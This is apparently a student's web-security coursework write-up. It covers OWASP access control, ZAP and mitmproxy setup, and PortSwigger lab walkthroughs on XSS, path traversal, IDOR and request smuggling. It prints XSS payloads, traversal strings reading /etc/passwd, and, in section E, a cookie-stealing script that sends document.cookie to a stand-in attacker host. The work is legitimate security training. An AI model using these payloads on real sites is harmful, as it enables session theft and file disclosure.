 # X) Read/Watch/Listen & Summarize

**Objective**
- A few bullet points per section is enough to summarize
- Add your own observation, question or idea


## X.1) [OWASP A01:2021](<https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/index.html>) - Broken Access Control
**Common access control vulnerabilities:**
- Violation of the principle of least privilege
- Bypassing access control checks with URL tampering
- Insecure direct object references
- Abusing JWT
- CORS misconfiguration


## X.2) PortSwigger Academy
[IDOR](<https://portswigger.net/web-security/access-control/idor>)
- a.k.a Insecure Direct Object References
- A vulnerability that arises from accessing objects directly with user-supplied input
- Most commonly associated with horizontal privilege escalation
 

[Path Traversal](<https://portswigger.net/web-security/file-path-traversal>)
- This type of vulnerability arises when a web server retrieves _files_ based on a _filename_ **appended** to a **base file path**
- Say a web server is serving content from `/home/webUser/content/*`, this is the base file path!
- If no controls are in place, one could read files from the home directory by tampering with the URL and replacing allowed file, say `file1`, with `../secretFile.txt`
  - Simply put: `/home/webUser/content/file1` now becomes `/home/webUser/secretFile`


[Cross-site scripting (XSS)](<https://portswigger.net/web-security/cross-site-scripting>)
- This vulnerability allows an attacker to inject malicious scripts into a trusted site, causing the victim’s browser to execute them as if they were legit. Leading to the attacker gaining the same access rights as the victim user.
3 main types:
1. Reflected XSS
   - The malicious script comes from the current HTTP request
3. Stored XSS
   - The malicious script comes from a website's database
   - The data is then included in later HTTP responses
5. DOM-based XSS
   - The vulnerability exists in client-side code, rather than server-side

How to prevent
- Filter user input as strictly as possible
- Encode user-controllable data in HTTP responses
- Use appropriate response headers suchs as `Content-Type` and `X-Content-Type-Options` to ensure browsers interpret responses as intended
- Content Security Policy (CSP) to reduce severity of any XSS vulnerability that still occur






------







# A) Totally Legit Certificate
**Objective**
- Install OWASP ZAP
- Generate a CA-certificate and install it on your browser
- Set ZAP as a proxy in your browser
- Set ZAP to capture also pictures
- Show that the requests appear in the ZAP interface


## Zed Attack Proxy
What is ZAP?
- Free, open-source penetration testing tool
- Specifically for testing web applications
- [Source](<https://www.zaproxy.org/getting-started/>)

Install and start it on Kali:
```bash
$ sudo apt install zaproxy
$ zaproxy
```
From this point on there's two ways we can go about this. Because ZAP [generates](<https://www.zaproxy.org/docs/desktop/addons/network/options/servercertificates/#generate>) a Root CA certificate for us, we can either:
1. Use the cert automatically
or
2. Import the cert to our browser

The first option is perfect for quickly testing a website or for one-offs. We do this by launching the browser through ZAP like so:

<img width="1635" height="1086" alt="2026-04-16-23:30:43" src="https://github.com/user-attachments/assets/13f686e1-11c5-4191-9d6d-67da36ef3af8" />


In order to capture pictures, one must: --> `Ctrl+Alt+O` --> type "display" in the search bar --> select the option --> check the selection on "Process images in HTTP requests/responses".


Back on the ZAP interface we can see all the requests and replies:

<img width="1911" height="1129" alt="2026-04-17-17:19:36" src="https://github.com/user-attachments/assets/2b1233fe-4107-49f5-a330-79ed6626d978" />


The second method you're going to see next!




-------






# B) FoxyProxy
**Objective**
- Install FoxyProxy standard
- Add ZAP as a proxy to it

## Setting up
Open up the extensions-manager in your browser, search for "foxyproxy standard" and lastly add it to firefox.

**Q:** What is FoxyProxy?

**A:** A proxy manager, especially useful when you have multiple proxies


Because we want foxyproxy to manage what gets proxied and where, we're now going use the second method of setting up ZAP:

In ZAP:
 - `Ctrl+Alt+O` --> `Network` --> `Server Certificates` --> then click `save` and specify where to save it
 - This will export the Root CA certificate locally

In Firefox:
 - Open `Settings` --> `Privacy & Security` --> `View Certificates` --> `Authorities` --> `Import` --> "Trust this CA to identify websites"
 - This will import the cert to your browser


Once we have that sorted we'll add the ZAP config to foxyproxy
<img width="1753" height="612" alt="2026-04-17-18:47:46" src="https://github.com/user-attachments/assets/c806a8ba-fa2a-463b-adad-30644d276991" />


We then pin the extension to our tab bar so that we can change settings on the go

<img width="481" height="592" alt="2026-04-17-19:09:33" src="https://github.com/user-attachments/assets/6b420978-3820-4800-b6c7-3d30acbd0af3" />

1. If we enable `ZAP`, everything gets proxied through => zaproxy
2. If we enable `Proxy by Patterns`, only portswigger.net and related domains goes through (for now)
3. If we disable it nothing will be proxied

Let's showcase quickly that it works.


### Exhibit A - ZAP is on
I browsed to `terokarvinen.com` and `archive.org` and we can see it in the output (not launching any spiders or attacks, just normal browsing)

<img width="1621" height="297" alt="2026-04-18-13:42:54" src="https://github.com/user-attachments/assets/72a5012a-3a8f-4f94-8c05-3e127e77dfcf" />


### Exhibit B - Proxy by pattern is on
**1. Browse to a random site**
<img width="591" height="370" alt="2026-04-18-13:48:16" src="https://github.com/user-attachments/assets/055b1749-741d-44ef-8490-6d0846287481" />

**2. Browse to target**
<img width="568" height="379" alt="2026-04-18-13:48:37" src="https://github.com/user-attachments/assets/41ae50dc-fc69-4957-8573-772f3cea7b8f" />

**3. Target matches the pattern and flows through to ZAP**
<img width="799" height="172" alt="2026-04-18-13:49:26" src="https://github.com/user-attachments/assets/5a58f78f-fd84-4f80-99ab-e35873036619" />


Let the timestamps serve as adequate proof that it works!








--------








# C) PortSwigger Labs: [Reflected XSS](<https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded>)
**Description**
- There's a simple reflected _cross-site scripting vulnerability_ present in the **search functionality**

**Objective**
- Perform a cross-site scripting attack that calls the `alert` function


## Reflecting
We start by poking the search functionality with a very basic HTML (bold) tag:
```html
<b>test</b>
```
Which returns a bolded "test":

<img width="760" height="223" alt="2026-04-19-15:40:56" src="https://github.com/user-attachments/assets/5800f8fa-f743-4bbc-9a62-b5c4b7fd3a62" />


We now suspect the page is vulnerable to further exploits as the input is not handled correctly.

We exploit this by typing the following into the search field:
```html
<script>alert('gotcha')</script>
```
Press enter => script runs and we get the alert ->

<img width="604" height="231" alt="2026-04-19-15:43:41" src="https://github.com/user-attachments/assets/ce64f076-7419-4329-a15c-1b61705e367d" />

The URL looks like:
```url
https://0aa0002804585a3d810525d8002a00fe.web-security-academy.net/?search=%3Cscript%3Ealert(%27gothca%27)%3C%2Fscript%3E
```

Notice the last part:
```url
/?search=%3Cscript%3Ealert(%27gothca%27)%3C%2Fscript%3E
```
The browser is unsuspecting, as we're dealing with a trusted source, so it executes the code. 

Were a victim now to use this URL, the "payload" would execute in their browser.




--------






# D) PortSwigger Labs: [Stored XSS](<https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded>)
**Description**
- Lab contains a stored _cross-site scripting vulnerability_ in the **comment functionality**

**Objective**
- Submit a comment that calls out the `alert` function when the blog post is viewed

## Storing Malicious Data
Recall that in `stored XSS` the malicious script can come from the website's own database. In this case the provided comment is not validated or encoded properly, so we can input almost anything we'd like and the website will store it as is in the database. Every time someone visits the blog post and the comments are loaded -> the script will run.

We type in the following:
```html
<script>alert('takeover')</script>
```
And post the comment.

Now every time that specific blog post is opened:

<img width="841" height="808" alt="2026-04-19-13:01:07" src="https://github.com/user-attachments/assets/627d2b60-0831-4cd7-9974-ab6b078cf24e" />


<img width="728" height="358" alt="2026-04-19-13:01:14" src="https://github.com/user-attachments/assets/cf11d6b9-2e32-4122-9a23-1d787d25e91f" />





--------




# E) xplain
**Objective**
- Explain how an attacker might benefit from XSS using an example


Let's build on the previous task and say a website is vulnerable to cross-site scripting, specifically the comment section. An attacker might exploit this by posting the following comment:
```html
<script>
  var img = new Image();
  img.src = 'http://cookiemonster.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>
```
This is a `Stored XSS attack`, as the malicious script is now stored in the websites database. When users visit the webpage where the **contaminated database record** is loaded -> the script is run, effectively stealing their cookie. This is active exfiltration, as the script grabs the cookie and physically sends it to an attackers server.

Depending on the extracted cookie an attacker might be able to 
- Hijack the session (import the cookie into their own browser and send requests with it, impersonating the victim user)
- Access sensitive data


Source can be found [here](<https://eitca.org/cybersecurity/eitc-is-wapt-web-applications-penetration-testing/web-attacks-practice/http-attributes-cookie-stealing/examination-review-http-attributes-cookie-stealing/how-can-cross-site-scripting-xss-attacks-be-used-to-steal-cookies/>) (original example modified).





--------






# F) PortSwigger Labs: [Simple Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-simple>)
**Description**
- Lab contains a _path traversal vulnerability_ in the **display of product images**

**Objective**
- Retrieve contents of the `/etc/passwd` file


## Travelling
> [!NOTE]
> I added a new entry into `Proxy by Patterns` to include lab traffic:
> - `*web-security-academy.net*`

When we get to the website in the lab we're faced with a basic shopping site, so we start by poking around and open up a new entry.

We then navigate back to the ZAP interface and inspect the GET request.

We find the following:
```html
GET https://0a7800560313d02980ee44ae00d30027.web-security-academy.net/image?filename=7.jpg HTTP/1.1
```
The website is loading a picture (`7.jpg` to be exact) to go along with the product. The content is served from a directory (presumably holding images), which we can now try to _escape_.

We copy the original GET request and paste it to `Requester`, which allows us to modify the request at will.

<img width="1345" height="312" alt="2026-04-20-00:10:31" src="https://github.com/user-attachments/assets/1255fdf5-67d7-4589-8a52-5fdfd768743a" />




We craft a new GET request, this time with `filename=/etc/passwd` and press send.

The server returns with `400 Bad Request` "No such file". So we do `filename=../../../../../../../etc/passwd`, send again and get a response. In order to view the loot we change the setting `Body: Image` to `Body: Text`. 

<img width="1633" height="675" alt="2026-04-20-00:27:44" src="https://github.com/user-attachments/assets/fc6a4dfc-3950-4984-bcd5-01b13aaa04e4" />

And there we have the `passwd` file. 

**Q:** Why did we move up so many directories?

**A:** Because we don't know the directory structure, this was basically the quickest way to get to the root of the filesystem. Once it reaches the root, any redundant `../`  are ignored.
In the rare case the original file would've been more deeply nested than that, we would've just added a few more `../` and got to the root.


**Q:** Why did the attack work?

**A:** The website didn't sanitize/validate the filename, so the server basically read the filepath as is and did exactly as told.



<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/4ac787dd-a082-4bfd-ac59-e1d7f877426d" />





-----







# G) PortSwigger Labs: [Path Traversal 2](<https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass>)
**Description**
- Lab contains a path traversal vulnerability in the display of the product images
- The application _blocks traversal sequences_ but **treats the supplied filename as being relative** to a default working directory

**Objective**
- Retrieve contents of the `/etc/passwd` file



## Here we go again
We open up a new entry on the new website and go back to the ZAP interface to investigate.

Here's the response:

<img width="1248" height="816" alt="2026-04-20-00:47:36" src="https://github.com/user-attachments/assets/ddade0b3-1c9a-42c0-9690-3436e72f963c" />


So we tamper with the image filename again and send a new request. I tried the same tactic as last time, but got "No such file" in response. I just wanted to travel a little bit but my passport got flagged in customs... 😔 


Wandering through the filesystem is controlled, but we're able to loot the server by providing an absolute filepath instead:


<img width="1626" height="678" alt="2026-04-20-00:52:13" src="https://github.com/user-attachments/assets/278c2faa-0f2c-4472-b946-92be83f473fb" />


To my understanding: This works because the application assumes the requested file is relative to the working directory (while blocking traversal attempts). We **bypass** the whole relativity part by passing it an absolute filepath instead. 

The core problem: The application logic is not enforcing the _final filepath_ **staying within** _the intended working directory_.


<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/4ac787dd-a082-4bfd-ac59-e1d7f877426d" />








------








# H) PortSwigger Labs: [Non-recursive Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively>)
**Description**
- Lab contains a path traversal vulnerability in the display of the product images
- The application _strips path traversal sequences_ from the user-supplied filename **before using it**

**Objective**
- Retrieve contents of the `/etc/passwd` file

## Travel ban?
<img width="1627" height="561" alt="2026-04-20-01:28:13" src="https://github.com/user-attachments/assets/50df64bb-0137-4215-bf83-5e7533ce795b" />

Let's turn that smile into something more useful!


The applications strips the sequences, sure, but how smart is it? What if we escape it's incomplete logic like so:

<img width="1627" height="715" alt="2026-04-20-01:35:03" src="https://github.com/user-attachments/assets/4db8a11a-c02c-4edc-87e3-e3dfde02c4d4" />



I suspect that the application is defending itself against path traversal attacks by simply removing occurences of the `../` sequence. We end up doing some simple math to circumvent this. Consider the following equation:

`....//` - `../` = `../` 


**Q:** Nice one! Now that you got that funny little analogy out of the way, what's actually going on?

**A:** Only accounting for `../` the application checks the string once, removes only the inner sequence (the part that matches the simple pattern), unintentionally leaving behind a valid traversal sequence. This leads to us escaping the control mechanism in a relatively simple but elegant fashion.



<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/34fc284a-153a-44f3-a259-05cddf0321a3" />







------






# I) PortSwigger Labs: [IDOR](<https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references>)
**Description**
- Lab stores user chat logs directly on the server's file system, and retrieves them using static URLs


**Objective**
- Find the password for the user `carlos` and log into their account


## Never share your password with anyone
I skimmed through the offerings of the website and landed on a live chat page, as a feature you can download and view the transcript.

I pressed `View transcript` and it downloaded `2.txt` on my machine, containing the transcript of our long & deep conversation.

<img width="1798" height="694" alt="2026-04-20-02:21:05" src="https://github.com/user-attachments/assets/7e76b1a5-5183-4feb-9755-3cb35f100fbd" />

Back on the ZAP interface I hunted down the response:

<img width="481" height="252" alt="2026-04-20-02:20:18" src="https://github.com/user-attachments/assets/199e491a-4eed-4958-b11e-f274aaf7c99a" />

Which then led me to copy the URL of the request:

<img width="1281" height="159" alt="2026-04-20-02:20:45" src="https://github.com/user-attachments/assets/4d9fd554-7007-4e13-b2e1-e5ba01bc3c5f" />

From `2.txt` we can assume that there is a `1.txt` somewhere, so I appended it to the URL and recovered a previous conversation using curl:

<img width="1908" height="408" alt="2026-04-20-02:19:08" src="https://github.com/user-attachments/assets/b1d1348e-c345-4784-9215-6a7d568b5258" />


The hunch was correct and we were succesfully able to compromise Carlos account:

<img width="1176" height="673" alt="2026-04-20-02:21:43" src="https://github.com/user-attachments/assets/97b915be-9c42-49a3-9fa5-bccfd4b7e439" />


**Q:** Wait, that was too quick, what happened here?

**A:** Recall from earlier that _Insecure Direct Object Reference (IDOR)_ is an _access control vulnerability_ that arises from _accessing objects_ **directly** _with user-supplied input_. The application **failed** to properly **authorize us**, which we exploited by manipulating the URL to access resources belonging to other users, in this case poor Carlos.


<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/aa20cb97-dab7-414b-b13d-58675bcbc46d" />








---------








# J) Pencode
> Bonus task

**Objective**
- Install [pencode](<https://github.com/ffuf/pencode>)
- Encode a string with it



## Encoding
Pencode can be installed using `go`. If you don't have `go` installed the workflow might look something like this:
```sh
$ sudo apt update && sudo install golang-go
$ go install github.com/ffuf/pencode/cmd/pencode@latest
```

Then you can either add `~/go/bin` to your `$PATH` or manually invoke pencode: `~/go/bin/pencode`.

**Q:** What is `pencode`?

**A:** A tool for creating payload encoding chains. Designed for automation. Source: Repo README

Let's encode our first payload:

<img width="1045" height="258" alt="2026-04-20-03:04:52" src="https://github.com/user-attachments/assets/a4ebdf0d-9fae-4904-b765-9670fb2f587b" />

> [!TIP]
> Invoke the program without any params to get a recap of all the options!







------









# K) Mitmproxy
> Bonus task

**Objective**
- Install Mitmproxy
- Showcase it in the terminal
- Enable TLS-decryption
- Pick a GET-request from the history, modify it, and resend it


## Man in the middle
Mitmproxy comes pre-installed on Kali. If you don't have it, navigate to the Mitmproxy website and follow the instructions.

<img width="1140" height="183" alt="2026-04-20-04:04:02" src="https://github.com/user-attachments/assets/bfdce313-15a3-4399-bcaa-d409fe3879ac" />

If you haven't changed the config directory and run mitmproxy for the first time, it will create keys for the CA in `~/.mitmproxy/`. Import the cert to your browser and you're good to go!


We already configured ZAP to use port `8080` and it so happens that mitmproxy uses the same one. ZAP is not running so from foxyproxy we can just enable ZAP and it will forward the traffic to mitmproxy.


Let's browse to `mitmproxy.org` and see the results

<img width="1911" height="1093" alt="2026-04-20-03:57:18" src="https://github.com/user-attachments/assets/816a0b1e-737e-440e-80fb-06a60e4e073c" />

We move around by using vim keys (j,k,h,l), delete entries with `d` and press enter to open up a record. Press `?` for help.



### Decrypting TLS

**Q:** We can see the clear-text content in the mitmproxy TUI, why do we need to enable TLS-decryption?

**A:** Say we want to capture some packets flowing through the proxy (using wireshark for example), well the traffic is encrypted so we don't know what we're looking at:

<img width="1621" height="379" alt="2026-04-20-16:19:40" src="https://github.com/user-attachments/assets/11c124bd-6f70-4daa-96eb-b8c7115cc33c" />




**Solution:** We enable TLS decryption. 

It's relatively simple: 
```bash
# Create the file to use
$ touch ~/.mitmproxy/sslkeylogfile.txt

# The file needs to be writable
$ chmod g+w ~/.mitmproxy/sslkeylogfile.txt

# Set the variable and start mitmproxy
$ SSLKEYLOGFILE="$HOME/.mitmproxy/sslkeylogfile.txt" mitmproxy
```

On Wireshark:
- `Ctrl+Shift+P` --> `Protocols` --> Type in "`tls`" --> Then set `(Pre)-Master-Secret log filename`

<img width="1282" height="216" alt="2026-04-20-16:35:39" src="https://github.com/user-attachments/assets/1c8439df-c88b-4922-8d28-bd152dd7a1ae" />


We start browsing and notice the `sslkeylogfile.txt` get's populated:

<img width="1905" height="358" alt="2026-04-20-16:59:47" src="https://github.com/user-attachments/assets/b1e2240d-3f07-4f6a-ad6c-24ea7e8dfcda" />


Back on Wireshark we can now decrypt the TLS

#### Before
<img width="1617" height="523" alt="2026-04-20-17:00:59" src="https://github.com/user-attachments/assets/44dbbd8a-a8d3-4cc1-89f2-de267208b2cf" />


#### After
<img width="1629" height="441" alt="2026-04-20-17:02:47" src="https://github.com/user-attachments/assets/9f6be863-def0-4d76-a39c-d126984584f0" />

## Start off fresh
To clear all entries press `z` and confirm

<img width="1903" height="205" alt="2026-04-20-17:11:13" src="https://github.com/user-attachments/assets/d335cc21-96c8-4255-b6df-4f5b403df03c" />


## Modify a request and send it away
Want to see Mitmproxy in action? Check [this](#The-Smuggler) out!


**Help received**
- Mitmproxy [documentation](<https://docs.mitmproxy.org/stable/>)







--------







# L) Arbitrary PortSwigger Lab
> Bonus Task

## [HTTP Request Smuggling](<https://portswigger.net/web-security/request-smuggling#what-is-http-request-smuggling>)
**Introduction**
- A technique for interfering with the way a web site processes sequences of HTTP requests
- This type of vulnerability is critical in nature, as it allows an attacker to bypass security controls, gain unauhtorized access to sensitive data, and directly compromise other users.
- NOTE: Primarly associated with HTTP/1 (/v2 may be vulnerabe depending on back-end architecture)

**Background**
- Contemporary applications often times use _load balancers_ / _reverse proxies_ that sit between the client and back-end servers. This is increasingly common especially in cloud-native applications
- When front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection due to performance and efficiency reasons.
- Because the requests are sent one after another, the server receiving them has to **determine** where **a request ends and the next one begins**
- This makes it crucial for front-end & back-end systems to agree about the boundaries between requests

**Vulnerability**
- Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides 2 different ways to specify where a request ends
  - The `Content-Length` header
    - Specifies the length of the body in bytes
  - The `Transfer-Encoding` header
    - Can be used to specify that the message body uses chunked encoding
    - Meaning the body contains 1 or more chunks of data
    - The message is **terminated** with a chunk of size zero
   
_Source: It's in the title_


## Lab: [HTTP request smuggling, basic CL.TE vulnerability](<https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te>)
**Description**
- Lab involves a front-end and back-end server. The front-end server doesn't support chunked encoding
- The front-end server rejects requests that aren't using the GET or POST method.

**Objective**
- Smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`



## The Smuggler
We're using Mitmproxy to intercept traffic, so we navigate to the vulnerable website in the browser go back to the proxy TUI.

We edit a request and use both `content-length` and `transfer-encoding` headers to see what happens.

We then hit `esc` to save and `r` to resend the request. We get the following error (Mitmproxy blocking exactly what we trying to do):

<img width="1597" height="108" alt="2026-04-20-19:14:28" src="https://github.com/user-attachments/assets/4afc3d6a-c0e9-4b36-90b2-ee79646258e9" />


I exited and tried to launch Mitmproxy with the option disabled like so:
```bash
$ mitmproxy --set validate_indbound_headers=false
```
Then:
- reload the web page
- locate a request
- edit
- resend

Only to get greeted by the same error from mitmproxy....

So we dump the [options configuration](<https://docs.mitmproxy.org/stable/concepts/options/>) and modify manually:
```bash
# --options will dump all configs to stdout
$ mitmproxy --options > ~/.mitmproxy/config.yaml

# Edit the config file
$ vim ~/.mitmproxy/config.yaml

# Locate the section
/validate_indbound

# Then set it to false:
validate_indbound_headers: false
```
<img width="1140" height="159" alt="2026-04-20-19:34:29" src="https://github.com/user-attachments/assets/81f52be2-5bae-461e-ac29-d525d497cfae" />

After getting it to work using the previous method, I realized you can just enter `O` in the TUI and modify the options on the go.... 😂

Looks like this:

<img width="1915" height="934" alt="2026-04-20-22:58:29" src="https://github.com/user-attachments/assets/f5639953-223d-48e9-9975-1669e53f6be2" />


Oh well, atleast we have a few ways to go about this now!


## Try again

We access the webpage and pick up a request from the Mitmproxy TUI:

<img width="1915" height="594" alt="2026-04-20-23:08:45" src="https://github.com/user-attachments/assets/59a9a27b-e759-49cc-a8bf-96688dd437f9" />

> [!NOTE]
> I highlighted the parts I want you to pay attention to

**First:** The request **method** is wrong, so that's the first thing we'll modify.

`e`dit --> `5) method` --> Insert `POST` --> Hit enter to save
- <img width="562" height="117" alt="2026-04-20-20:34:13" src="https://github.com/user-attachments/assets/0aa2526a-477c-4b34-970d-ffa11d5d0e4b" />

Updated:
- <img width="1087" height="73" alt="2026-04-20-23:11:20" src="https://github.com/user-attachments/assets/815f608e-902d-4325-a2a9-fba01a71ee57" />


Then we hit `e` to edit again and pick `8) request-headers`. We remove the unnecessary and optional stuff and add the following:
<img width="1710" height="283" alt="2026-04-20-23:31:57" src="https://github.com/user-attachments/assets/c585e581-f66b-42aa-990b-acb58e5bf672" />


Explained:
- We specify HTTP/1.1 because that's the version that's vulnerable
- Host is the website we're on
- By using both `content-length` and `transfer-encoding` we perform a simple HTTP request smuggling attack
- I took the example from the study material we went through before starting the lab


> [!TIP]
> If you modify a flow too much and want to revert to the original one, you can just enter `V` to undo all your modifications!


We hit `r` to send and get an error HTTP/2 error, which is a problem as we want to use HTTP/1, so we enter options config and change 2 values to `false`:

<img width="660" height="103" alt="2026-04-20-23:22:54" src="https://github.com/user-attachments/assets/f26cffd5-e229-44a2-80ed-4ed03deca5b5" />

We send again and this time atleast we get a response:

<img width="1902" height="528" alt="2026-04-20-23:25:36" src="https://github.com/user-attachments/assets/3de399d9-e887-4e39-ba07-6cd9189d1e7c" />


I got a timeout while I was crafting a new request header:

<img width="1725" height="165" alt="2026-04-20-23:40:19" src="https://github.com/user-attachments/assets/9c7696c0-e803-42e5-bc40-fb79d958f56c" />


So we had to restart the whole lab...


## Third time's the charm
At this point I realized i'm probably forming this request all wrong, especially because i'm not familiar with Mitmproxy.

I tried one last thing:
- Removed `POST / HTTP/1.1` from the header
- Edited the URL and appended `HTTP/1.1`
- Moved the payload into the request body

<img width="1918" height="453" alt="2026-04-21-00:13:14" src="https://github.com/user-attachments/assets/6784be02-11eb-468d-b671-bab8f7614d3a" />

Got "protocol error" so I removed the `HTTP/1.1` from the URL, hit send and got a different response. 

Even though in the previous requests it looked like the HTTP version was appended to the URL, I don't know if you can actually modify it in this way.

I had tried atleast 10 different ways of doing this and nothing simply worked. I thought it might be some kind of issue with my tooling so before quitting I switched to ZAP.


I took the original request, changed the method, removed all else except `host` and `connection` headers and pasted it to `Requester`.

At this point I had done the lab for around 5 hours so I thought let me at least see what it looks like to complete, I modeled the **example solution** and the final request then came to look like this:
<img width="1182" height="426" alt="2026-04-21-00:25:23" src="https://github.com/user-attachments/assets/367e5004-ff50-4bbb-bda6-76d8637bd433" />

When we hit `send` we get:

<img width="573" height="220" alt="2026-04-21-00:25:49" src="https://github.com/user-attachments/assets/0e691b62-8574-4db6-b7f3-06ca08bb21b4" />


I chose the option `Combine display for Header and Body`:

<img width="919" height="51" alt="2026-04-21-00:49:22" src="https://github.com/user-attachments/assets/5331f539-cbd8-449f-8b25-bfb15191731c" />


Sent it again and at least now it goes through. **The problem** was that I was trying to **insert the body into the header**, which I originally thought was the idea.

And now that we can send it -->

<img width="1725" height="454" alt="2026-04-21-00:58:25" src="https://github.com/user-attachments/assets/bc091e9a-0e71-4199-96b2-823bd0ff0f98" />

It keeps timing out... I give up... 

<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/f448ab1b-9176-411b-9c63-851ce6764a2b" />


This was a complete bust. I did the lab for 5 hours and didn't even complete it... 😂😂😂 

But not to be too negative, at least I learned something more about HTTP requests / methods that I didn't know before and got more familiar with Mitmproxy!


Till next time, adios! 🫡






